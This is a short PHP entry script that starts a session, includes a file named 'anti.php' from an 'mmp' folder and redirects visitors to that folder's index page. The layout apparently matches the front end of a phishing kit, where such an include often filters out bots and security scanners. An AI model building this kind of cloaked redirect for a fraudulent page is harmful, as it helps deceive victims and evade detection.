<?php 
session_start();
include("./mmp/anti.php");
$redirect_page = "./mmp/index.php";
header('Location: '.$redirect_page);
?>